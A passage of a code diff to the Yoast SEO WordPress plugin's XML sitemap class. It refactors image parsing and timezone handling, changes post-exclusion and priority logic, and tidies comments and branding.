+			$users = get_users( array( 'who' => 'authors' ) );
+			$users = apply_filters( 'wpseo_sitemap_exclude_author', $users );
+			$users = wp_list_pluck( $users, 'ID' );
 
 			$count = count( $users );
-			$n     = ( $count > $this->max_entries ) ? (int) ceil( $count / $this->max_entries ) : 1;
+			$n     = ( $count > 0 ) ? 1 : 0;
+
+			if ( $count > $this->max_entries ) {
+				$n = (int) ceil( $count / $this->max_entries );
+			};
 
 			for ( $i = 0; $i < $n; $i ++ ) {
 				$count = ( $n > 1 ) ? ( $i + 1 ) : '';
 
-				// must use custom raw query because WP User Query does not support ordering by usermeta
-				// Retrieve the newest updated profile timestamp overall
+				// Must use custom raw query because WP User Query does not support ordering by usermeta.
+				// Retrieve the newest updated profile timestamp overall.
 				// TODO order by usermeta supported since WP 3.7, update implementation? R.
-
 				$date_query = "
 						SELECT mt1.meta_value FROM $wpdb->users
 						INNER JOIN $wpdb->usermeta ON ($wpdb->users.ID = $wpdb->usermeta.user_id)
@@ -565,7 +510,7 @@ class WPSEO_Sitemaps {
 						)
 					);
 
-					// Retrieve the newest updated profile timestamp by an offset
+					// Retrieve the newest updated profile timestamp by an offset.
 				}
 				else {
 					$date = $wpdb->get_var(
@@ -576,7 +521,7 @@ class WPSEO_Sitemaps {
 						)
 					);
 				}
-				$date = $this->get_datetime_with_timezone( '@' . $date );
+				$date = $this->timezone->get_datetime_with_timezone( '@' . $date );
 
 				$this->sitemap .= '<sitemap>' . "\n";
 				$this->sitemap .= '<loc>' . wpseo_xml_sitemaps_base_url( 'author-sitemap' . $count . '.xml' ) . '</loc>' . "\n";
@@ -586,7 +531,7 @@ class WPSEO_Sitemaps {
 			unset( $users, $count, $n, $i, $date_query, $date );
 		}
 
-		// allow other plugins to add their sitemaps to the index
+		// Allow other plugins to add their sitemaps to the index.
 		$this->sitemap .= apply_filters( 'wpseo_sitemap_index', '' );
 		$this->sitemap .= '</sitemapindex>';
 	}
@@ -594,9 +539,9 @@ class WPSEO_Sitemaps {
 	/**
 	 * Function to dynamically filter the change frequency
 	 *
-	 * @param string $filter  Expands to wpseo_sitemap_$filter_change_freq, allowing for a change of the frequency for numerous specific URLs
-	 * @param string $default The default value for the frequency
-	 * @param string $url     The URL of the currenty entry
+	 * @param string $filter  Expands to wpseo_sitemap_$filter_change_freq, allowing for a change of the frequency for numerous specific URLs.
+	 * @param string $default The default value for the frequency.
+	 * @param string $url     The URL of the current entry.
 	 *
 	 * @return mixed|void
 	 */
@@ -627,7 +572,7 @@ class WPSEO_Sitemaps {
 	/**
 	 * Build a sub-sitemap for a specific post type -- example.com/post_type-sitemap.xml
 	 *
-	 * @param string $post_type Registered post type's slug
+	 * @param string $post_type Registered post type's slug.
 	 */
 	function build_post_type_map( $post_type ) {
 		global $wpdb;
@@ -688,20 +633,20 @@ class WPSEO_Sitemaps {
 
 			$archive_url = get_post_type_archive_link( $post_type );
 			/**
-			 * Filter: 'wpseo_sitemap_post_type_archive_link' - Allow changing the URL WordPress SEO uses in the XML sitemap for this post type archive.
+			 * Filter: 'wpseo_sitemap_post_type_archive_link' - Allow changing the URL Yoast SEO uses in the XML sitemap for this post type archive.
 			 *
 			 * @api float $archive_url The URL of this archive
 			 *
-			 * @param string $post_type The post type this archive is for
+			 * @param string $post_type The post type this archive is for.
 			 */
 			$archive_url = apply_filters( 'wpseo_sitemap_post_type_archive_link', $archive_url, $post_type );
 			if ( $archive_url ) {
 				/**
-				 * Filter: 'wpseo_xml_post_type_archive_priority' - Allow changing the priority of the URL WordPress SEO uses in the XML sitemap.
+				 * Filter: 'wpseo_xml_post_type_archive_priority' - Allow changing the priority of the URL Yoast SEO uses in the XML sitemap.
 				 *
 				 * @api float $priority The priority for this URL, ranging from 0 to 1
 				 *
-				 * @param string $post_type The post type this archive is for
+				 * @param string $post_type The post type this archive is for.
 				 */
 				$output .= $this->sitemap_url(
 					array(
@@ -709,7 +654,7 @@ class WPSEO_Sitemaps {
 						'pri' => apply_filters( 'wpseo_xml_post_type_archive_priority', 0.8, $post_type ),
 						'chf' => $this->filter_frequency( $post_type . '_archive', 'weekly', $archive_url ),
 						'mod' => $this->get_last_modified( $post_type ),
-						// get_lastpostmodified( 'gmt', $post_type ) #17455
+						// Function get_lastpostmodified( 'gmt', $post_type ) #17455.
 					)
 				);
 			}
@@ -746,8 +691,8 @@ class WPSEO_Sitemaps {
 		 */
 		while ( $total > $offset ) {
 
-			// Optimized query per this thread: http://wordpress.org/support/topic/plugin-wordpress-seo-by-yoast-performance-suggestion
-			// Also see http://explainextended.com/2009/10/23/mysql-order-by-limit-performance-late-row-lookups/
+			// Optimized query per this thread: http://wordpress.org/support/topic/plugin-wordpress-seo-by-yoast-performance-suggestion.
+			// Also see http://explainextended.com/2009/10/23/mysql-order-by-limit-performance-late-row-lookups/.
 			$query = $wpdb->prepare( "SELECT l.ID, post_title, post_content, post_name, post_parent, post_modified_gmt, post_date, post_date_gmt FROM ( SELECT ID FROM $wpdb->posts {$join_filter} WHERE post_status = '%s' AND post_password = '' AND post_type = '%s' AND post_date != '0000-00-00 00:00:00' {$where_filter} ORDER BY post_modified ASC LIMIT %d OFFSET %d ) o JOIN $wpdb->posts l ON l.ID = o.ID ORDER BY l.ID",
 				$status, $post_type, $steps, $offset
 			);
@@ -776,19 +721,18 @@ class WPSEO_Sitemaps {
 
 			$offset = ( $offset + $steps );
 
+			$posts_to_exclude = explode( ',', $this->options['excluded-posts'] );
+
 			if ( is_array( $posts ) && $posts !== array() ) {
 				foreach ( $posts as $p ) {
 					$p->post_type   = $post_type;
 					$p->post_status = 'publish';
 					$p->filter      = 'sample';
 
-					if ( WPSEO_Meta::get_value( 'meta-robots-noindex', $p->ID ) === '1' && WPSEO_Meta::get_value( 'sitemap-include', $p->ID ) !== 'always' ) {
+					if ( WPSEO_Meta::get_value( 'meta-robots-noindex', $p->ID ) === '1' ) {
 						continue;
 					}
-					if ( WPSEO_Meta::get_value( 'sitemap-include', $p->ID ) === 'never' ) {
-						continue;
-					}
-					if ( WPSEO_Meta::get_value( 'redirect', $p->ID ) !== '' ) {
+					if ( in_array( $p->ID, $posts_to_exclude ) ) {
 						continue;
 					}
 
@@ -809,13 +753,13 @@ class WPSEO_Sitemaps {
 					$url['loc'] = get_permalink( $p );
 
 					/**
-					 * Filter: 'wpseo_xml_sitemap_post_url' - Allow changing the URL WordPress SEO uses in the XML sitemap.
+					 * Filter: 'wpseo_xml_sitemap_post_url' - Allow changing the URL Yoast SEO uses in the XML sitemap.
 					 *
 					 * Note that only absolute local URLs are allowed as the check after this removes external URLs.
 					 *
 					 * @api string $url URL to use in the XML sitemap
 					 *
-					 * @param object $p Post object for the URL
+					 * @param object $p Post object for the URL.
 					 */
 					$url['loc'] = apply_filters( 'wpseo_xml_sitemap_post_url', $url['loc'], $p );
 
@@ -831,9 +775,11 @@ class WPSEO_Sitemaps {
 
 					$canonical = WPSEO_Meta::get_value( 'canonical', $p->ID );
 					if ( $canonical !== '' && $canonical !== $url['loc'] ) {
-						/* Let's assume that if a canonical is set for this page and it's different from
+						/*
+						Let's assume that if a canonical is set for this page and it's different from
 						   the URL of this post, that page is either already in the XML sitemap OR is on
-						   an external site, either way, we shouldn't include it here. */
+						   an external site, either way, we shouldn't include it here.
+						*/
 						continue;
 					}
 					else {
@@ -851,55 +797,7 @@ class WPSEO_Sitemaps {
 					$content = '<p><img src="' . $this->image_url( get_post_thumbnail_id( $p->ID ) ) . '" alt="' . $p->post_title . '" /></p>' . $content;
 
 					if ( preg_match_all( '`<img [^>]+>`', $content, $matches ) ) {
-						foreach ( $matches[0] as $img ) {
-							if ( preg_match( '`src=["\']([^"\']+)["\']`', $img, $match ) ) {
-								$src = $match[1];
-								if ( WPSEO_Utils::is_url_relative( $src ) === true ) {
-									if ( $src[0] !== '/' ) {
-										continue;
-									}
-									else {
-										// The URL is relative, we'll have to make it absolute
-										$src = $this->home_url . $src;
-									}
-								}
-								elseif ( strpos( $src, 'http' ) !== 0 ) {
-									// Protocol relative url, we add the scheme as the standard requires a protocol
-									$src = $scheme . ':' . $src;
-
-								}
-
-								if ( strpos( $src, $host ) === false ) {
-									continue;
-								}
-
-								if ( $src != esc_url( $src ) ) {
-									continue;
-								}
-
-								if ( isset( $url['images'][ $src ] ) ) {
-									continue;
-								}
-
-								$image = array(
-									'src' => apply_filters( 'wpseo_xml_sitemap_img_src', $src, $p ),
-								);
-
-								if ( preg_match( '`title=["\']([^"\']+)["\']`', $img, $title_match ) ) {
-									$image['title'] = str_replace( array( '-', '_' ), ' ', $title_match[1] );
-								}
-								unset( $title_match );
-
-								if ( preg_match( '`alt=["\']([^"\']+)["\']`', $img, $alt_match ) ) {
-									$image['alt'] = str_replace( array( '-', '_' ), ' ', $alt_match[1] );
-								}
-								unset( $alt_match );
-
-								$image           = apply_filters( 'wpseo_xml_sitemap_img', $image, $p );
-								$url['images'][] = $image;
-							}
-							unset( $match, $src );
-						}
+						$url['images'] = $this->parse_matched_images( $matches, $p, $scheme, $host );
 					}
 					unset( $content, $matches, $img );
 
@@ -913,7 +811,7 @@ class WPSEO_Sitemaps {
 					$url['images'] = apply_filters( 'wpseo_sitemap_urlimages', $url['images'], $p->ID );
 
 					if ( ! in_array( $url['loc'], $stackedurls ) ) {
-						// Use this filter to adjust the entry before it gets added to the sitemap
+						// Use this filter to adjust the entry before it gets added to the sitemap.
 						$url = apply_filters( 'wpseo_sitemap_entry', $url, 'post', $p );
 						if ( is_array( $url ) && $url !== array() ) {
 							$output       .= $this->sitemap_url( $url );
@@ -921,9 +819,10 @@ class WPSEO_Sitemaps {
 						}
 					}
 
-					// Clear the post_meta and the term cache for the post, as we no longer need it now.
+					// Clear the post_meta and the term cache for the post
 					// wp_cache_delete( $p->ID, 'post_meta' );
 					// clean_object_term_cache( $p->ID, $post_type );
+					// as we no longer need it now.
 				}
 				unset( $p, $url );
 			}
@@ -949,9 +848,76 @@ class WPSEO_Sitemaps {
 	}
 
 	/**
+	 * Parsing the matched images
+	 *
+	 * @param array  $matches
+	 * @param object $p
+	 * @param string $scheme
+	 * @param string $host
+	 *
+	 * @return array
+	 */
+	private function parse_matched_images( $matches, $p, $scheme, $host ) {
+
+		$return = array();
+
+		foreach ( $matches[0] as $img ) {
+			if ( preg_match( '`src=["\']([^"\']+)["\']`', $img, $match ) ) {
+				$src = $match[1];
+				if ( WPSEO_Utils::is_url_relative( $src ) === true ) {
+					if ( $src[0] !== '/' ) {
+						continue;
+					}
+					else {
+						// The URL is relative, we'll have to make it absolute.
+						$src = $this->home_url . $src;
+					}
+				}
+				elseif ( strpos( $src, 'http' ) !== 0 ) {
+					// Protocol relative url, we add the scheme as the standard requires a protocol.
+					$src = $scheme . ':' . $src;
+
+				}
+
+				if ( strpos( $src, $host ) === false ) {
+					continue;
+				}
+
+				if ( $src != esc_url( $src ) ) {
+					continue;
+				}
+
+				if ( isset( $return[ $src ] ) ) {
+					continue;
+				}
+
+				$image = array(
+					'src' => apply_filters( 'wpseo_xml_sitemap_img_src', $src, $p ),
+				);
+
+				if ( preg_match( '`title=["\']([^"\']+)["\']`', $img, $title_match ) ) {
+					$image['title'] = str_replace( array( '-', '_' ), ' ', $title_match[1] );
+				}
+				unset( $title_match );
+
+				if ( preg_match( '`alt=["\']([^"\']+)["\']`', $img, $alt_match ) ) {
+					$image['alt'] = str_replace( array( '-', '_' ), ' ', $alt_match[1] );
+				}
+				unset( $alt_match );
+
+				$image    = apply_filters( 'wpseo_xml_sitemap_img', $image, $p );
+				$return[] = $image;
+			}
+			unset( $match, $src );
+		}
+
+		return $return;
+	}
+
+	/**
 	 * Build a sub-sitemap for a specific taxonomy -- example.com/tax-sitemap.xml
 	 *
-	 * @param string $taxonomy Registered taxonomy's slug
+	 * @param string $taxonomy Registered taxonomy's slug.
 	 */
 	function build_tax_map( $taxonomy ) {
 		if (
@@ -1017,7 +983,7 @@ class WPSEO_Sitemaps {
 					}
 				}
 
-				// Grab last modified date
+				// Grab last modified date.
 				$sql        = $wpdb->prepare(
 					"
 						SELECT MAX(p.post_modified_gmt) AS lastmod
@@ -1036,7 +1002,7 @@ class WPSEO_Sitemaps {
 				$url['mod'] = $wpdb->get_var( $sql );
 				$url['chf'] = $this->filter_frequency( $c->taxonomy . '_term', 'weekly', $url['loc'] );
 
-				// Use this filter to adjust the entry before it gets added to the sitemap
+				// Use this filter to adjust the entry before it gets added to the sitemap.
 				$url = apply_filters( 'wpseo_sitemap_entry', $url, 'term', $c );
 
 				if ( is_array( $url ) && $url !== array() ) {
@@ -1084,7 +1050,7 @@ class WPSEO_Sitemaps {
 		$n      = (int) $this->n;
 		$offset = ( $n > 1 ) ? ( ( $n - 1 ) * $this->max_entries ) : 0;
 
-		// initial query to fill in missing usermeta with the current timestamp
+		// Initial query to fill in missing usermeta with the current timestamp.
 		$users = get_users(
 			array(
 				'who'        => 'authors',
@@ -1105,7 +1071,7 @@ class WPSEO_Sitemaps {
 		}
 		unset( $users, $user );
 
-		// query for users with this meta
+		// Query for users with this meta.
 		$users = get_users(
 			array(
 				'who'      => 'authors',
@@ -1117,11 +1083,9 @@ class WPSEO_Sitemaps {
 			)
 		);
 
-		add_filter( 'wpseo_sitemap_exclude_author', array( $this, 'user_sitemap_remove_excluded_authors' ), 8 );
-
 		$users = apply_filters( 'wpseo_sitemap_exclude_author', $users );
 
-		// ascending sort
+		// Ascending sort.
 		usort( $users, array( $this, 'user_map_sorter' ) );
 
 		if ( is_array( $users ) && $users !== array() ) {
@@ -1134,7 +1098,7 @@ class WPSEO_Sitemaps {
 						'chf' => $this->filter_frequency( 'author_archive', 'daily', $author_link ),
 						'mod' => date( 'c', isset( $user->_yoast_wpseo_profile_updated ) ? $user->_yoast_wpseo_profile_updated : time() ),
 					);
-					// Use this filter to adjust the entry before it gets added to the sitemap
+					// Use this filter to adjust the entry before it gets added to the sitemap.
 					$url = apply_filters( 'wpseo_sitemap_entry', $url, 'user', $user );
 
 					if ( is_array( $url ) && $url !== array() ) {
@@ -1198,7 +1162,7 @@ class WPSEO_Sitemaps {
 		if ( ! headers_sent() ) {
 			header( $this->http_protocol() . ' 200 OK', true, 200 );
 			// Prevent the search engines from indexing the XML Sitemap.
-			header( 'X-Robots-Tag: noindex,follow', true );
+			header( 'X-Robots-Tag: noindex, follow', true );
 			header( 'Content-Type: text/xml' );
 		}
 		echo '<?xml version="1.0" encoding="', esc_attr( $this->charset ), '"?>';
@@ -1206,7 +1170,7 @@ class WPSEO_Sitemaps {
 			echo apply_filters( 'wpseo_stylesheet_url', $this->stylesheet ), "\n";
 		}
 		echo $this->sitemap;
-		echo "\n", '<!-- XML Sitemap generated by Yoast WordPress SEO -->';
+		echo "\n", '<!-- XML Sitemap generated by Yoast SEO -->';
 
 		$debug_display = defined( 'WP_DEBUG_DISPLAY' ) && true === WP_DEBUG_DISPLAY;
 		$debug         = defined( 'WP_DEBUG' ) && true === WP_DEBUG;
@@ -1228,7 +1192,7 @@ class WPSEO_Sitemaps {
 	/**
 	 * Build the <url> tag for a given URL.
 	 *
-	 * @param array $url Array of parts that make up this entry
+	 * @param array $url Array of parts that make up this entry.
 	 *
 	 * @return string
 	 */
@@ -1237,8 +1201,8 @@ class WPSEO_Sitemaps {
 		$date = null;
 
 		if ( ! empty( $url['mod'] ) ) {
-			// Create a DateTime object date in the correct timezone
-			$date = $this->get_datetime_with_timezone( $url['mod'] );
+			// Create a DateTime object date in the correct timezone.
+			$date = $this->timezone->get_datetime_with_timezone( $url['mod'] );
 		}
 
 		$url['loc'] = htmlspecialchars( $url['loc'] );
@@ -1303,7 +1267,7 @@ class WPSEO_Sitemaps {
 	/**
 	 * Get the modification date for the last modified post in the post type:
 	 *
-	 * @param array $post_types Post types to get the last modification date for
+	 * @param array $post_types Post types to get the last modification date for.
 	 *
 	 * @return string
 	 */
@@ -1314,7 +1278,7 @@ class WPSEO_Sitemaps {
 			$post_types = array( $post_types );
 		}
 
-		// We need to do this only once, as otherwise we'd be doing a query for each post type
+		// We need to do this only once, as otherwise we'd be doing a query for each post type.
 		if ( ! is_array( $this->post_type_dates ) ) {
 			$this->post_type_dates = array();
 			$query                 = "SELECT post_type, MAX(post_modified_gmt) AS date FROM $wpdb->posts WHERE post_status IN ('publish','inherit') AND post_type IN ('" . implode( "','", get_post_types( array( 'public' => true ) ) ) . "') GROUP BY post_type ORDER BY post_modified_gmt DESC";
@@ -1338,43 +1302,17 @@ class WPSEO_Sitemaps {
 			unset( $post_type );
 		}
 
-		return $this->get_datetime_with_timezone( $result );
+		return $this->timezone->get_datetime_with_timezone( $result );
 	}
 
-	/**
-	 * Get the datetime object, in site's time zone, if the datetime string was valid
-	 *
-	 * @param string $datetime_string The datetime string in UTC time zone, that needs to be converted to a DateTime object
-	 * @param string $format
-	 *
-	 * @return DateTime|null in site's time zone
-	 */
-	private function get_datetime_with_timezone( $datetime_string, $format = 'c' ) {
-
-		static $utc_timezone, $local_timezone;
-
-		if ( ! isset( $utc_timezone ) ) {
-			$utc_timezone   = new DateTimeZone( 'UTC' );
-			$local_timezone = new DateTimeZone( $this->get_timezone_string() );
-		}
-
-		if ( ! empty( $datetime_string ) && WPSEO_Utils::is_valid_datetime( $datetime_string ) ) {
-			$datetime = new DateTime( $datetime_string, $utc_timezone );
-			$datetime->setTimezone( $local_timezone );
-
-			return $datetime->format( $format );
-		}
-
-		return null;
-	}
 
 	/**
 	 * Sorts an array of WP_User by the _yoast_wpseo_profile_updated meta field
 	 *
-	 * since 1.6
+	 * @since 1.6
 	 *
-	 * @param Wp_User $a The first WP user
-	 * @param Wp_User $b The second WP user
+	 * @param Wp_User $a The first WP user.
+	 * @param Wp_User $b The second WP user.
 	 *
 	 * @return int 0 if equal, 1 if $a is larger else or -1;
 	 */
@@ -1456,11 +1394,11 @@ class WPSEO_Sitemaps {
 
 		$url = '';
 
-		if ( $file = get_post_meta( $post_id, '_wp_attached_file', true ) ) { // Get attached file
-			if ( 0 === strpos( $file, $uploads['basedir'] ) ) { // Check that the upload base exists in the file location
+		if ( $file = get_post_meta( $post_id, '_wp_attached_file', true ) ) { // Get attached file.
+			if ( 0 === strpos( $file, $uploads['basedir'] ) ) { // Check that the upload base exists in the file location.
 				$url = str_replace( $uploads['basedir'], $uploads['baseurl'], $file );
 			}
-			// Replace file location with url location
+			// Replace file location with url location.
 			elseif ( false !== strpos( $file, 'wp-content/uploads' ) ) {
 				$url = $uploads['baseurl'] . substr( $file, ( strpos( $file, 'wp-content/uploads' ) + 18 ) );
 			}
@@ -1572,19 +1510,13 @@ class WPSEO_Sitemaps {
 	 * @return float|mixed
 	 */
 	private function calculate_priority( $post ) {
+
+		$return = 0.6;
+		if ( $post->post_parent == 0 && $post->post_type == 'page' ) {
+			$return = 0.8;
+		}
+
 		$front_id = get_option( 'page_on_front' );
-		$pri      = WPSEO_Meta::get_value( 'sitemap-prio', $post->ID );
-		if ( is_numeric( $pri ) ) {
-			$return = (float) $pri;
-		}
-		else {
-			if ( $post->post_parent == 0 && $post->post_type == 'page' ) {
-				$return = 0.8;
-			}
-			else {
-				$return = 0.6;
-			}
-		}
 
 		if ( isset( $front_id ) && $post->ID == $front_id ) {
 			$return = 1.0;
@@ -1592,12 +1524,12 @@ class WPSEO_Sitemaps {
 
 		/**
 		 * Filter: 'wpseo_xml_post_type_archive_priority' - Allow changing the priority of the URL
-		 * WordPress SEO uses in the XML sitemap.
+		 * Yoast SEO uses in the XML sitemap.
 		 *
 		 * @api float $priority The priority for this URL, ranging from 0 to 1
 		 *
-		 * @param string $post_type The post type this archive is for
-		 * @param object $p         The post object
+		 * @param string $post_type The post type this archive is for.
+		 * @param object $p         The post object.
 		 */
 		$return = apply_filters( 'wpseo_xml_sitemap_post_priority', $return, $post->post_type, $post );
 
